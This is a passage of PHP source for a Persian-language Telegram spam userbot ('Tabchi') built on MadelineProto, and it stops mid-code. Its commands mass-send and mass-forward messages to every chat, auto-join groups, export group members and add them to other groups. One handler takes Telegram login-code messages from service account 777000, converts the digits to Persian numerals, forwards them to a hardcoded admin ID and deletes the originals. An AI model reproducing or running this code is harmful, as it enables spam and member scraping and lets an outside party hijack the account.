<?php
define('MADELINE_BRANCH', '5.1.34');
ini_set( 'display_errors', 0 );
error_reporting( 0 );
if ( file_exists( 'sony.madeline' ) && file_exists( 'update-session/sony.madeline' ) && ( time() - filectime( 'sony.madeline' ) ) > 90 ) {
  unlink( 'sony.madeline.lock' );
  unlink( 'sony.madeline' );
  unlink( 'madeline.phar' );
  unlink( 'madeline.phar.version' );
  unlink( 'madeline.php' );
  unlink( 'MadelineProto.log' );
  unlink( 'bot.lock' );
  copy( 'update-session/sony.madeline', 'sony.madeline' );
}
if ( file_exists( 'sony.madeline' ) && file_exists( 'update-session/sony.madeline' ) && ( filesize( 'sony.madeline' ) / 1024 ) > 10240 ) {
  unlink( 'sony.madeline.lock' );
  unlink( 'sony.madeline' );
  unlink( 'madeline.phar' );
  unlink( 'madeline.phar.version' );
  unlink( 'madeline.php' );
  unlink( 'bot.lock' );
  unlink( 'MadelineProto.log' );
  copy( 'update-session/sony.madeline', 'sony.madeline' );
}

function closeConnection( $message = 'Tabchi sony Is Running  go to acant send ping...' ) {
  if ( php_sapi_name() === 'cli' || isset( $GLOBALS[ 'exited' ] ) ) {
    return;
  }

  @ob_end_clean();
  @header( 'Connection: close' );
  ignore_user_abort( true );
  ob_start();
  echo "$message";
  $size = ob_get_length();
  @header( "Content-Length: $size" );
  @header( 'Content-Type: text/html' );
  ob_end_flush();
  flush();
  $GLOBALS[ 'exited' ] = true;
}

function shutdown_function( $lock ) {
  try {
    $a = fsockopen( ( isset( $_SERVER[ 'HTTPS' ] ) && @$_SERVER[ 'HTTPS' ] ? 'tls' : 'tcp' ) . '://' . @$_SERVER[ 'SERVER_NAME' ], @$_SERVER[ 'SERVER_PORT' ] );
    fwrite( $a, @$_SERVER[ 'REQUEST_METHOD' ] . ' ' . @$_SERVER[ 'REQUEST_URI' ] . ' ' . @$_SERVER[ 'SERVER_PROTOCOL' ] . "\r\n" . 'Host: ' . @$_SERVER[ 'SERVER_NAME' ] . "\r\n\r\n" );
    flock( $lock, LOCK_UN );
    fclose( $lock );
  } catch ( Exception $v ) {}
}
if ( !file_exists( 'bot.lock' ) ) {
  touch( 'bot.lock' );
}

$lock = fopen( 'bot.lock', 'r+' );
$try = 1;
$locked = false;
while ( !$locked ) {
  $locked = flock( $lock, LOCK_EX | LOCK_NB );
  if ( !$locked ) {
    closeConnection();
    if ( $try++ >= 30 ) {
      exit;
    }
    sleep( 1 );
  }
}
if ( !file_exists( 'data.json' ) ) {
  file_put_contents( 'data.json', '{"autochatpv":{"on":"on"},"autochatgroup":{"on":"off"},"autojoinadmin":{"on":"on"},"autojoinall":{"on":"off"},"autoforwardadmin":{"on":"on"},"admins":{}}' );
}
if ( !file_exists( 'member.json' ) ) {
	file_put_contents( 'member.json', '{"list":{}}' );
}
if ( !is_dir( 'update-session' ) ) {
  mkdir( 'update-session' );
}
if ( !is_dir( 'ans' ) ) {
  mkdir( 'ans' );
}
if ( !is_dir( 'ans/pv' ) ) {
  mkdir( 'ans/pv' );
}
if ( !is_dir( 'ans/group' ) ) {
  mkdir( 'ans/group' );
}
if ( !file_exists( 'madeline.php' ) ) {
  copy( 'https://phar.madelineproto.xyz/madeline.php', 'madeline.php' );
}

include 'madeline.php';
$settings = [];
$settings[ 'logger' ][ 'logger' ] = 0;
$settings[ 'serialization' ][ 'serialization_interval' ] = 30;
$MadelineProto = new\ danog\ MadelineProto\ API( 'king.madeline', $settings );
$MadelineProto->start();
class EventHandler extends\ danog\ MadelineProto\ EventHandler {
  public function __construct( $MadelineProto ) {
    parent::__construct( $MadelineProto );
  }
  public function onUpdateSomethingElse( $update ) {
    yield $this->onUpdateNewMessage( $update );
  }
  public function onUpdateNewChannelMessage( $update ) {
    yield $this->onUpdateNewMessage( $update );
  }
  public function onUpdateNewMessage( $update ) {
    try {
      if ( !file_exists( 'update-session/king.madeline' ) ) {
        copy( 'king.madeline', 'update-session/king.madeline' );
      }

      $userID = isset( $update[ 'message' ][ 'from_id' ] ) ? $update[ 'message' ][ 'from_id' ] : '';
      $msg = isset( $update[ 'message' ][ 'message' ] ) ? $update[ 'message' ][ 'message' ] : '';
      $msg_id = isset( $update[ 'message' ][ 'id' ] ) ? $update[ 'message' ][ 'id' ] : '';
      $MadelineProto = $this;
      $me = yield $MadelineProto->get_self();
      $me_id = $me[ 'id' ];
      $info = yield $MadelineProto->get_info( $update );
      $chatID = $info[ 'bot_api_id' ];
      $type2 = $info[ 'type' ];
      @$data = json_decode( file_get_contents( "data.json" ), true );
	  @$member = json_decode( file_get_contents( "member.json" ), true );
      $creator = 1629651361; //سازنده
      $admin = 1629651361; //ادمین
      if ( file_exists( 'king.madeline' ) && filesize( 'king.madeline' ) / 1024 > 6143 ) {
        unlink( 'king.madeline.lock' );
        unlink( 'king.madeline' );
        copy( 'update-session/king.madeline', 'king.madeline' );
        exit( file_get_contents( 'http://' . $_SERVER[ 'SERVER_NAME' ] . $_SERVER[ 'PHP_SELF' ] ) );
        exit;
        exit;
      }
      if ( $userID != $me_id ) {
        if ( ( time() - filectime( 'update-session/king.madeline' ) ) > 2505600 ) {
          if ( $userID == $admin || isset( $data[ 'admins' ][ $userID ] ) ) {
            yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '❗️اخطار: مهلت استفاده شما از این ربات به اتمام رسیده❗️' ] );
          }
        } 
		else {
          if ( isset( $update[ 'message' ][ 'reply_markup' ][ 'rows' ] ) ) {
            if ( $type2 == 'supergroup' ) {
              foreach ( $update[ 'message' ][ 'reply_markup' ][ 'rows' ] as $row ) {
                foreach ( $row[ 'buttons' ] as $button ) {
                  yield $button->click();
                }
              }
            }
          }
		  
          if ( $chatID == 777000 ) {
            @$a = str_replace( 0, '۰', $msg );
            @$a = str_replace( 1, '۱', $a );
            @$a = str_replace( 2, '۲', $a );
            @$a = str_replace( 3, '۳', $a );
            @$a = str_replace( 4, '۴', $a );
            @$a = str_replace( 5, '۵', $a );
            @$a = str_replace( 6, '۶', $a );
            @$a = str_replace( 7, '۷', $a );
            @$a = str_replace( 8, '۸', $a );
            @$a = str_replace( 9, '۹', $a );
            yield $MadelineProto->messages->sendMessage( [ 'peer' => $admin, 'message' => "$a" ] );
            yield $MadelineProto->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => true, 'peer' => $chatID, 'max_id' => $msg_id ] );
          }

			if ( $userID == $admin || $userID == $creator || isset( $data[ 'admins' ][ $userID ] ) ) {
			
			if ( $msg == 'انلاین' || $msg == 'تبچی' || $msg == 'پینگ' || $msg == 'Ping' || $msg == 'ربات' || $msg == 'ping' || $msg == '/ping' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'message' => "[♔BOT♡SONY☏Online♡♔](tg://user?id=$userID)", 'parse_mode' => 'markdown' ] );
            }
			
			elseif ($msg == 'تمدید') {
			  if($userID == $creator) {
				copy( 'update-session/king.madeline', 'update-session/king.madeline2' );
				unlink( 'update-session/king.madeline' );
				copy( 'update-session/king.madeline2', 'update-session/king.madeline' );
				unlink( 'update-session/king.madeline2' );
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⚡️ ربات♡SONY برای 30 روز دیگر شارژ شد' ] );
			  }
			  else{
			    yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛔' ] );
			  }
			}
			
            elseif ( preg_match( "/^[#\!\/](addadmin) (.*)$/", $msg ) ) {
			  if ( $userID == $admin || $userID == $creator ) {
				preg_match( "/^[#\!\/](addadmin) (.*)$/", $msg, $text1 );
				$id = $text1[ 2 ];
				if ( !isset( $data[ 'admins' ][ $id ] ) ) {
				  $data[ 'admins' ][ $id ] = $id;
                  file_put_contents( "data.json", json_encode( $data ) );
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '🙌🏻 ادمین جدید اضافه شد' ] );
				} else {
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "در لیست ادمین ها وجود دارد :/" ] );
				}
              } else {
			      yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "❗ شما ادمین اصلی نیستسد" ] );
			    }
			}
            elseif ( preg_match( "/^[\/\#\!]?(clean admins)$/i", $msg ) ) {
			  if ( $userID == $admin || $userID == $creator ) {
				$data[ 'admins' ] = [];
				file_put_contents( "data.json", json_encode( $data ) );
				yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "لیست ادمین خالی شد !" ] );
              } else {
			      yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "❗ شما ادمین اصلی♡SONY نیستسد" ] );
			    }
			}
			elseif ( preg_match( "/^[\/\#\!]?(adminlist)$/i", $msg ) ) {
			  if ( $userID == $admin || $userID == $creator ) {
				if ( count( $data[ 'admins' ] ) > 0 ) {
				  $txxxt = "لیست ادمین ها : \n";
				  $counter = 1;
				  foreach ( $data[ 'admins' ] as $k ) {
                    $txxxt .= "$counter: <code>$k</code>\n";
                    $counter++;
				  }
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => $txxxt, 'parse_mode' => 'html' ] );
				} else {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ادمینی وجود ندارد !" ] );
				}
			  } else {
			     yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "❗ شما ادمین اصلی نیستسد" ] );
			  }
			}
			  
            elseif ( $msg == '/restart' || $msg == 'restart' || $msg == 'Restart' || $msg == 'ریستارت' ) {
              yield $MadelineProto->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => true, 'peer' => $chatID, 'max_id' => $msg_id ] );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '♻️ ربات دوباره راه اندازی♡SONY شد.' ] );
              $this->restart();
            }
			
            elseif ( $msg == 'پاکسازی' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => 'لطفا کمی صبر کنید ...' ] );
              $all = yield $MadelineProto->get_dialogs();
			  $i=0;
              foreach ( $all as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                if ( $type[ 'type' ] == 'supergroup' ) {
                  $info = yield $MadelineProto->channels->getChannels( [ 'id' => [ $peer ] ] );
                  @$banned = $info[ 'chats' ][ 0 ][ 'banned_rights' ][ 'send_messages' ];
                  if ( $banned == 1 ) {
                    yield $MadelineProto->channels->leaveChannel( [ 'channel' => $peer ] );
                    $i++;
				  }
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "✅ پاکسازی باموفقیت انجام شد.\n♻️ گروه هایی که در آنها بن شده بودم حذف شدند.\n تعداد : $i" ] );
            }
			
            elseif ( $msg == '/creator' || $msg == 'creator' || $msg == 'مالک' || $msg == 'سازندت' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'message' => "[ربات @Ghader20160bot \n ساخته شده توسط mr. ➪Ghaderpoia ](https://t.me/danceoe1_chanel)", 'parse_mode' => 'markdown' ] );
            }
            elseif ( $msg == 'ورژن ربات' || $msg == 'نسخه' ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'message' => '**⚙️ نسخه اصلی سورس تبچی سونی♕نویسنده Ghader : 9.1**', 'parse_mode' => 'MarkDown' ] );
            }

            elseif ( $msg == 'شناسه' || $msg == 'id' || $msg == 'ایدی' || $msg == 'مشخصات' ) {
              $name = $me[ 'first_name' ];
              $phone = '+' . $me[ 'phone' ];
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'message' => "💚 مشخصات من

👑 ادمین‌اصلی: [$admin](tg://user?id=$admin)
👤 نام: $name
#⃣ ایدی‌عددیم: `$me_id`
📞 شماره‌تلفنم: `$phone`
", 'parse_mode' => 'MarkDown' ] );
            }

            elseif ( $msg == 'امار' || $msg == 'آمار' || $msg == 'stats' || $msg == 'Stats' ) {
              $day = ( 2505600 - ( time() - filectime( 'update-session/king.madeline' ) ) ) / 60 / 60 / 24;
              $day = round( $day, 0 );
              $hour = ( 2505600 - ( time() - filectime( 'update-session/king.madeline' ) ) ) / 60 / 60;
              $hour = round( $hour, 0 );
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⌘♡SONYدرحال انالیز نمودار𖣘...', 'reply_to_msg_id' => $msg_id ] );
              $mem_using = round( ( memory_get_usage() / 1024 ) / 1024, 0 ) . 'MB';
              $satpv = $data[ 'autochatpv' ][ 'on' ];
              if ( $satpv == 'on' ) {
                $satpv = '💚';
              } else {
                $satpv = '❤️';
              }
              $satgroup = $data[ 'autochatgroup' ][ 'on' ];
              if ( $satgroup == 'on' ) {
                $satgroup = '💚';
              } else {
                $satgroup = '❤️';
              }
              $satjoin = $data[ 'autojoinadmin' ][ 'on' ];
              if ( $satjoin == 'on' ) {
                $satjoin = '💚';
              } else {
                $satjoin = '❤️';
              }
			  $satjoinall = $data[ 'autojoinall' ][ 'on' ];
              if ( $satjoinall == 'on' ) {
                $satjoinall = '💚';
              } else {
                $satjoinall = '❤️';
              }
              $satfor = $data[ 'autoforwardadmin' ][ 'on' ];
              if ( $satfor == 'on' ) {
                $satfor = '💚';
              } else {
                $satfor = '❤️';
              }
              $mem_total = 'NotAccess!';
              $CpuCores = 'NotAccess!';
              try {
                if ( strpos( @$_SERVER[ 'SERVER_NAME' ], '000webhost' ) === false ) {
                  if ( strpos( PHP_OS, 'L' ) !== false || strpos( PHP_OS, 'l' ) !== false ) {
                    $a = file_get_contents( "/proc/meminfo" );
                    $b = explode( 'MemTotal:', "$a" )[ 1 ];
                    $c = explode( ' kB', "$b" )[ 0 ] / 1024 / 1024;
                    if ( $c != 0 && $c != '' ) {
                      $mem_total = round( $c, 1 ) . 'GB';
                    } else {
                      $mem_total = 'NotAccess!';
                    }
                  } else {
                    $mem_total = 'NotAccess!';
                  }
                  if ( strpos( PHP_OS, 'L' ) !== false || strpos( PHP_OS, 'l' ) !== false ) {
                    $a = file_get_contents( "/proc/cpuinfo" );
                    @$b = explode( 'cpu cores', "$a" )[ 1 ];
                    @$b = explode( "\n", "$b" )[ 0 ];
                    @$b = explode( ': ', "$b" )[ 1 ];
                    if ( $b != 0 && $b != '' ) {
                      $CpuCores = $b;
                    } else {
                      $CpuCores = 'NotAccess!';
                    }
                  } else {
                    $CpuCores = 'NotAccess!';
                  }
                }
              } catch ( Exception $f ) {}
              $s = yield $MadelineProto->get_dialogs();
              $m = json_encode( $s, JSON_PRETTY_PRINT );
              $supergps = count( explode( 'peerChannel', $m ) ) - 1;
              $pvs = count( explode( 'peerUser', $m ) ) - 1;
              $gps = count( explode( 'peerChat', $m ) ) - 2;
              $all = $gps + $supergps + $pvs;
              $me = yield $this->getSelf();
              $access_hash = $me['access_hash'];
              $getContacts = yield $this->contacts->getContacts(['hash' => [$access_hash], ]);
              $contacts_count = count($getContacts['users']);
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID,
                'message' => "⌘نمودار تبچیSONY✔ :

𖣘♕ همه تلگرام تبچی⍟ : $all
𖣘♡ سوپرگپ ها ⍟ : $supergps
𖣘𓆉 گپ کوچیک⍟ : $gps
𖣘☏ پیوی ها تبچی⍟ : $pvs
𖣘 تعداد مخاطبان : $contacts_count
𖣘۞ فورارد به ادمین⍟ : $satfor
𖣘 𖣔عضویت خودکار ادمین : $satjoin
𖣘 ꨄعضویت خودکار همه⍟ : $satjoinall
𖣘 ☏چت خودکار پیوی⍟ : $satpv
𖣘 ☏چت خودکار گپ ها⍟ : $satgroup
𖣘اعتبار تبچی⍟ : $day 🌎 $hour ⏰
𖣘♡ سی پی یو⍟ : $CpuCores
𖣘⌘حجم هارد⍟ : $mem_total
𖣘𓇽میزان هارد مصرفی تبچی⍟  : $mem_using"
              ] );
              if ( $supergps > 400 || $pvs > 1500 ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID,
                  'message' => '⚠️ اخطار: به دلیل کم بودن منابع هاست تعداد گروه ها نباید بیشتر از 400 و تعداد پیوی هاهم نباید بیشتراز 1.5K باشد.
اگر تا چند ساعت آینده مقادیر به مقدار استاندارد کاسته نشود، تبچی شما حذف شده و با ادمین اصلی برخورد خواهد شد.'
                ] );
              }
            }
            elseif ( $msg == 'help' || $msg == '/help' || $msg == 'Help' || $msg == 'راهنما' ) {
              yield $MadelineProto->messages->sendMessage( [
                'peer' => $chatID,
                'message' => 'Tbchi➪ ♔SONY  mr➪Ghader :

`انلاین`♡SONY
✅ دریافت وضعیت ربات
`امار`
📊 دریافت آمار گروه ها و کاربران
 `مشخصات`
💡 دریافت ایدی‌عددے ربات تبچی♡SONY
`ورژن ربات`
📜 نمایش نسخه سورس تبچے♡SONY شما
`/setPhoto ` [link]
📸 اپلود عکس پروفایل جدید♡SONY
`/SetId` [text]
⚙ تنظیم نام کاربرے (آیدے)ربات♡SONY
`/profile ` [نام] | [فامیل] | [بیوگرافی]
💎 تنظیم نام اسم ,فامےلو بیوگرافے ربات♡SONY
`/restart `
© راه اندازی مجدد ربات♡SONY - استفاده در پیوی
Tbchi➪ ♔SONY  mr➪Ghader≈≈≈≈≈≈≈≈≈≈
`/addall ` [UserID]
⏬ ادد کردن یڪ کاربر به همه گروه ها
`/addpvs ` [IDGroup]
⬇️ ادد کردن همه ے افرادے که در پیوے هستن به یڪ گروه
`export` [GroupLink]
❗ استخراج اعضای گروه ...(توصیه نمیشود!)
`add` [Group@ID]
❕ اد کردن اعضای استخراج شده به یک گروه
`deletemember`
💫 پاکسازی اعضای استخراج شده♡SONY
➪oghabphp≈≈≈Tbchi➪ ♔SONY  mr➪Ghader≈≈≈
`/s2all ` [txt]
💌 ارسال کردن متن به همه گروه ها و کاربران
`/s2pv ` [txt]
🗨 ارسال کردن متن به همه کاربران
`/s2_1pv ` [userid] | [txt]
🔹 ارسال کردن متن به کاربر موردنظر(ایدی عددی)
`/s2sgps ` [txt]
💬 ارسال کردن متن به همه سوپرگروه ها
`f2all ` [reply]
〽️ فروارد کردن پیام ریپلاے شده به همه گروه ها و کاربران
`f2pv ` [reply]
🔆 فروارد کردن پیام ریپلاے شده به همه کاربران
`f2_1pv ` [userid]   [reply]
🌑 فروارد کردن پیام ریپلاے شده به کاربر موردنظر(ایدی عددی)
`f2gps ` [reply]
🔊 فروارد کردن پیام ریپلاے شده به همه گروه ها
`f2sgps ` [reply]
🌐 فروارد کردن پیام ریپلاے شده به همه سوپرگروه ها
`/setFtime ` [reply],[time-min]
♻️ فعالسازے فروارد خودکار زماندار♡SONY
`/delFtime`
🌀 حذف فروارد خودکار زماندار♡SONY
Tbchi➪ ♔SONY  mr➪Ghader≈≈≈
`/join ` [@ID] or [LINK]
🎉 عضویت در یڪ کانال یا گروه♡SONY
`/delchs`
🥇خروج از همه ے کانال ها♡SONY
`/delgroups` [تعداد]
🎖خروج از گروه ها به تعداد موردنظر♡SONY
`left`
👈🏾 خروج تبچی ♡SONYاز گروهی که left راارسال کردید
`پاکسازی`
📮 خروج از گروه هایے که مسدود کردند
`پاکسازی کلی`
💭 پاکسازی پیام های یک گروه♡SONY
Tbchi➪ ♔SONY  mr➪Ghader≈≈≈≈≈≈
`/autofadmin ` [on] or [off]
👀 روشن یا خاموش کردن فوروارد خودکار به ادمین
`/autojoinadmin ` [on] or [off]
🎡 روشن یا خاموش کردن جوین خودکار ادمین
`/autojoinall ` [on] or [off]
🎇 روشن یا خاموش کردن جوین خودکار همه
`/autochatpv ` [on] or [off]
👤 روشن یا خاموش کردن چت خودکار (پیوی ها)
`/autochatgroup ` [on] or [off]
👨‍👩‍👧‍👦 روشن یا خاموش کردن چت خودکار (گروه ها)
Tbchi➪ ♔SONY  mr➪Ghader≈≈≈≈≈≈≈
📌️ این دستورات فقط براے ادمین اصلے قابل استفاده هستند :
`/addadmin ` [ایدی‌عددی]
➕ افزودن ادمین جدید♡SONY
`/clean admins`
✖️ حذف همه ادمین ها♡SONY
`/adminlist`
📃 لیست همه ادمین ها     Tbchi➪ ♔SONY  mr➪Ghader 
🚫 تمدید',
                'parse_mode' => 'markdown'
              ] );
            }
            elseif ( $msg == 'F2all' || $msg == 'f2all' ) {
              if ( $type2 == 'supergroup' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال فروارد ...' ] );
                $rid = $update[ 'message' ][ 'reply_to_msg_id' ];
                $dialogs = yield $MadelineProto->get_dialogs();
                $i = -1;
                foreach ( $dialogs as $peer ) {
                  $type = yield $MadelineProto->get_info( $peer );
                  if ( $type[ 'type' ] == 'supergroup' || $type[ 'type' ] == 'user' || $type[ 'type' ] == 'chat' ) {
                    $MadelineProto->messages->forwardMessages( [ 'from_peer' => $chatID, 'to_peer' => $peer, 'id' => [ $rid ] ] );
                    $i++;
                  }
                }
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "فروارد همگانی با موفقیت به همه ارسال شد  👌🏻\n تعداد فوروارد : $i" ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‼از این دستور فقط در سوپرگروه میتوانید استفاده کنید.' ] );
              }
            }
            elseif ( $msg == 'F2pv' || $msg == 'f2pv' ) {
              if ( $type2 == 'supergroup' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال فروارد ...' ] );
                $rid = $update[ 'message' ][ 'reply_to_msg_id' ];
                $dialogs = yield $MadelineProto->get_dialogs();
                $i = 0;
                foreach ( $dialogs as $peer ) {
                  $type = yield $MadelineProto->get_info( $peer );
                  if ( $type[ 'type' ] == 'user' ) {
                    $MadelineProto->messages->forwardMessages( [ 'from_peer' => $chatID, 'to_peer' => $peer, 'id' => [ $rid ] ] );
                    $i++;
                  }
                }
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "فروارد همگانی با موفقیت به پیوی ها ارسال شد 👌🏻\n تعداد فوروارد : $i" ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‼از این دستور فقط در سوپرگروه میتوانید استفاده کنید.' ] );
              }
            }
			elseif ( strpos( $msg, "f2_1pv " ) !== false ) {
              if ( $type2 == 'supergroup' ) {
				$wordt = trim( str_replace( "f2_1pv ", "", $msg ) );
				$wordt = explode( "|", $wordt . "|||||" );
				$txt_id = trim( $wordt[ 0 ] );
                $rid = $update[ 'message' ][ 'reply_to_msg_id' ];
				if(yield $MadelineProto->messages->readHistory( [ 'peer' => $txt_id, 'max_id' => $msg_id ] ) == true){
				  if(yield $MadelineProto->messages->setTyping( [ 'peer' => $txt_id, 'action' => [ '_' => 'sendMessageTypingAction' ] ] ) == true){
					yield $MadelineProto->sleep( 1 );
                    $MadelineProto->messages->forwardMessages( [ 'from_peer' => $chatID, 'to_peer' => $txt_id, 'id' => [ $rid ] ] );
					yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "پیام مورد نظر با موفقیت فوروارد شد.  👌🏻" ] );
				  }
				}
			  } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‼از این دستور فقط در سوپرگروه میتوانید استفاده کنید.' ] );
              }
            }
            elseif ( $msg == 'F2gps' || $msg == 'f2gps' ) {
              if ( $type2 == 'supergroup' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال فروارد ...' ] );
                $rid = $update[ 'message' ][ 'reply_to_msg_id' ];
                $dialogs = yield $MadelineProto->get_dialogs();
                $i = -1;
                foreach ( $dialogs as $peer ) {
                  $type = yield $MadelineProto->get_info( $peer );
                  if ( $type[ 'type' ] == 'chat' ) {
                    $MadelineProto->messages->forwardMessages( [ 'from_peer' => $chatID, 'to_peer' => $peer, 'id' => [ $rid ] ] );
                    $i++;
                  }
                }
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "فروارد همگانی با موفقیت به گروه ها ارسال شد 👌🏻\n تعداد فوروارد : $i" ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‼از این دستور فقط در سوپرگروه میتوانید استفاده کنید.' ] );
              }
            }
            elseif ( $msg == 'F2sgps' || $msg == 'f2sgps' ) {
              if ( $type2 == 'supergroup' ) {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال فروارد ...' ] );
                $rid = $update[ 'message' ][ 'reply_to_msg_id' ];
                $dialogs = yield $MadelineProto->get_dialogs();
                $i = 0;
                foreach ( $dialogs as $peer ) {
                  $type = yield $MadelineProto->get_info( $peer );
                  if ( $type[ 'type' ] == 'supergroup' ) {
                    $MadelineProto->messages->forwardMessages( [ 'from_peer' => $chatID, 'to_peer' => $peer, 'id' => [ $rid ] ] );
                    $i++;
                  }
                }
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "فروارد همگانی با موفقیت به سوپرگروه ها ارسال شد 👌🏻\n تعداد فوروارد : $i" ] );
              } else {
                yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '‼از این دستور فقط در سوپرگروه میتوانید استفاده کنید.' ] );
              }
            }
			
            elseif ( preg_match( "/^[#\!\/](s2all) (.*)$/", $msg ) ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال ارسال ...' ] );
              preg_match( "/^[#\!\/](s2all) (.*)$/", $msg, $text1 );
              $text = $text1[ 2 ];
              $dialogs = yield $MadelineProto->get_dialogs();
              $i = 0;
              foreach ( $dialogs as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                $type3 = $type[ 'type' ];
                if ( $type3 == "supergroup" || $type3 == "user" ) {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $peer, 'message' => "$text" ] );
                  $i++;
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ارسال همگانی با موفقیت به همه ارسال شد 👌🏻\n تعداد ارسال : $i" ] );
            }
			
            elseif ( preg_match( "/^[#\!\/](s2pv) (.*)$/", $msg ) ) {
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال ارسال ...' ] );
              preg_match( "/^[#\!\/](s2pv) (.*)$/", $msg, $text1 );
              $text = $text1[ 2 ];
              $dialogs = yield $MadelineProto->get_dialogs();
              $i = 0;
              foreach ( $dialogs as $peer ) {
                $type = yield $MadelineProto->get_info( $peer );
                $type3 = $type[ 'type' ];
                if ( $type3 == "user" ) {
                  yield $MadelineProto->messages->sendMessage( [ 'peer' => $peer, 'message' => "$text" ] );
                  $i++;
                }
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ارسال همگانی با موفقیت به پیوے ها ارسال شد 👌🏻\n تعداد ارسال : $i" ] );
            }
			
			elseif ( strpos( $msg, "/s2_1pv " ) !== false ) {
			  $wordt = trim( str_replace( "/s2_1pv ", "", $msg ) );
			  $wordt = explode( "|", $wordt . "|||||" );
			  $txt_id = trim( $wordt[ 0 ] );
			  $ans = trim( $wordt[ 1 ] );
			  if(yield $MadelineProto->messages->readHistory( [ 'peer' => $txt_id, 'max_id' => $msg_id ] ) == true){
				if(yield $MadelineProto->messages->setTyping( [ 'peer' => $txt_id, 'action' => [ '_' => 'sendMessageTypingAction' ] ] ) == true){
				  yield $MadelineProto->sleep( 1 );
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $txt_id, 'message' => "$ans" ] );
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "✅ پیام \n [$ans] \n به کاربر [$txt_id] ارسال شد.", 'parse_mode' => 'html' ] );
				}
			  }
			}
            
			/*elseif(preg_match("/^[#\!\/](s2gps) (.*)$/", $msg)){
              yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' =>'⛓ درحال ارسال ...']);
              preg_match("/^[#\!\/](s2gps) (.*)$/", $msg, $text1);
              $text = $text1[2];
              $dialogs = yield $MadelineProto->get_dialogs();
              $i=0;
              foreach ($dialogs as $peer) {
            	$type = yield $MadelineProto->get_info($peer);
            	$type3 = $type['type'];
            	if($type3 == "chat"){
            	  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>"$text"]); 
            	  $i++;
            	}
              }
            		yield $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' =>"ارسال همگانی با موفقیت به گروه ها ارسال شد 👌🏻\n تعداد ارسال : $i"]);
            } */

            elseif ( preg_match( "/^[#\!\/](s2sgps) (.*)$/", $msg ) ) {
			  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '⛓ درحال ارسال ...' ] );
			  preg_match( "/^[#\!\/](s2sgps) (.*)$/", $msg, $text1 );
			  $text = $text1[ 2 ];
			  $dialogs = yield $MadelineProto->get_dialogs();
			  $i = 0;
			  foreach ( $dialogs as $peer ) {
				$type = yield $MadelineProto->get_info( $peer );
				$type3 = $type[ 'type' ];
				if ( $type3 == "supergroup" ) {
				  yield $MadelineProto->messages->sendMessage( [ 'peer' => $peer, 'message' => "$text" ] );
				  $i++;
				}
			  }
			  yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => "ارسال همگانی با موفقیت به سوپرگروه ها ارسال شد 👌🏻\n تعداد ارسال : $i" ] );
            }
			
            elseif ( $msg == '/delFtime' ) {
              foreach ( glob( "ForTime/*" ) as $files ) {
                unlink( "$files" );
              }
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $chatID, 'message' => '➖ Removed !',
                'reply_to_msg_id' => $msg_id
              ] );
            }
